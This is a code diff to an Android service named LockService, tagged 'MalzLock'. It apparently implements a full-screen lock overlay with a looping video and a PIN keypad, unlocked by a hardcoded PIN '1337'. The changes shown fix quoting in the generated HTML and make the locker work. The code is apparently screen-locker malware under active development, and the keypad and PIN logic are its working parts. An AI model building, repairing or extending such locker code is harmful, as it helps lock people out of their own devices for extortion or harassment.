@@ -22,7 +22,7 @@ import java.nio.charset.StandardCharsets;
 public class LockService extends Service {
 
     private static final String TAG = "MalzLock";
-    private static final String VIDEO_URL = "https://h.uguu.se/JNjCAEri.mp4"\;
+    private static final String VIDEO_URL = "https://h.uguu.se/JNjCAEri.mp4";
     private static final String CORRECT_PIN = "1337";
 
     private WindowManager wm;
@@ -128,6 +128,7 @@ public class LockService extends Service {
     }
 
     private String buildHtml() {
+        String q = String.valueOf((char) 34);
         StringBuilder sb = new StringBuilder();
         sb.append("<!DOCTYPE html><html lang='en'><head>");
         sb.append("<meta charset='UTF-8'>");
@@ -150,7 +151,9 @@ public class LockService extends Service {
         sb.append("</style></head><body>");
 
         sb.append("<video autoplay loop muted playsinline>");
-        sb.append("<source src='").append(VIDEO_URL).append("' type='video/mp4'>");
+        sb.append("<source src='");
+        sb.append(VIDEO_URL);
+        sb.append("' type='video/mp4'>");
         sb.append("</video>");
 
         sb.append("<div class='overlay'></div>");
@@ -162,22 +165,84 @@ public class LockService extends Service {
         sb.append("</div>");
         sb.append("<div class='keypad'>");
 
-        sb.append("<button onclick=\"press('1')\">1</button>");
-        sb.append("<button onclick=\"press('2')\">2</button>");
-        sb.append("<button onclick=\"press('3')\">3</button>");
-        sb.append("<button onclick=\"press('4')\">4</button>");
-        sb.append("<button onclick=\"press('5')\">5</button>");
-        sb.append("<button onclick=\"press('6')\">6</button>");
-        sb.append("<button onclick=\"press('7')\">7</button>");
-        sb.append("<button onclick=\"press('8')\">8</button>");
-        sb.append("<button onclick=\"press('9')\">9</button>");
-        sb.append("<button class='small' onclick=\"clearPin()\">CLEAR</button>");
-        sb.append("<button onclick=\"press('0')\">0</button>");
-        sb.append("<button class='small' onclick=\"backspace()\">DELETE</button>");
+        sb.append("<button onclick=");
+        sb.append(q);
+        sb.append("press('1')");
+        sb.append(q);
+        sb.append(">1</button>");
+
+        sb.append("<button onclick=");
+        sb.append(q);
+        sb.append("press('2')");
+        sb.append(q);
+        sb.append(">2</button>");
+
+        sb.append("<button onclick=");
+        sb.append(q);
+        sb.append("press('3')");
+        sb.append(q);
+        sb.append(">3</button>");
+
+        sb.append("<button onclick=");
+        sb.append(q);
+        sb.append("press('4')");
+        sb.append(q);
+        sb.append(">4</button>");
+
+        sb.append("<button onclick=");
+        sb.append(q);
+        sb.append("press('5')");
+        sb.append(q);
+        sb.append(">5</button>");
+
+        sb.append("<button onclick=");
+        sb.append(q);
+        sb.append("press('6')");
+        sb.append(q);
+        sb.append(">6</button>");
+
+        sb.append("<button onclick=");
+        sb.append(q);
+        sb.append("press('7')");
+        sb.append(q);
+        sb.append(">7</button>");
+
+        sb.append("<button onclick=");
+        sb.append(q);
+        sb.append("press('8')");
+        sb.append(q);
+        sb.append(">8</button>");
+
+        sb.append("<button onclick=");
+        sb.append(q);
+        sb.append("press('9')");
+        sb.append(q);
+        sb.append(">9</button>");
+
+        sb.append("<button class='small' onclick=");
+        sb.append(q);
+        sb.append("clearPin()");
+        sb.append(q);
+        sb.append(">CLEAR</button>");
+
+        sb.append("<button onclick=");
+        sb.append(q);
+        sb.append("press('0')");
+        sb.append(q);
+        sb.append(">0</button>");
+
+        sb.append("<button class='small' onclick=");
+        sb.append(q);
+        sb.append("backspace()");
+        sb.append(q);
+        sb.append(">DELETE</button>");
+
         sb.append("</div></div>");
 
         sb.append("<script>");
-        sb.append("var CORRECT_PIN='").append(CORRECT_PIN).append("';");
+        sb.append("var CORRECT_PIN='");
+        sb.append(CORRECT_PIN);
+        sb.append("';");
         sb.append("function press(n){var p=document.getElementById('pin');if(p.value.length>=4)return;p.value+=n;if(p.value.length===4)checkPin();}");
         sb.append("function clearPin(){document.getElementById('pin').value='';}");
         sb.append("function backspace(){var p=document.getElementById('pin');p.value=p.value.slice(0,-1);}");
